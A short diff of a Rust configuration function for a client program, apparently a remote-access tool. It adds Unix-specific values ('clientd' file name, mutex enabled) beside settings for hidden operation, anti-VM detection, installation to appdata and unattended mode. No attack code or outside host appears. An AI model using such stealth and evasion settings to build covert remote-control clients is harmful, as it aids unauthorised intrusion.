@@ -7,12 +7,23 @@ pub fn get_config() -> ClientConfig {
         port: "1337".to_string(),
         group: "Default".to_string(),
 
+        #[cfg(unix)]
         install: false,
+        #[cfg(not(unix))]
+        install: false,
+
+        #[cfg(unix)]
+        file_name: "clientd".to_string(),
+        #[cfg(not(unix))]
         file_name: "Test.exe".to_string(),
+
         install_folder: "appdata".to_string(),
         enable_hidden: true,
         anti_vm_detection: false,
 
+        #[cfg(unix)]
+        mutex_enabled: true,
+        #[cfg(not(unix))]
         mutex_enabled: false,
         mutex: "TEST123".to_string(),
         unattended_mode: false,
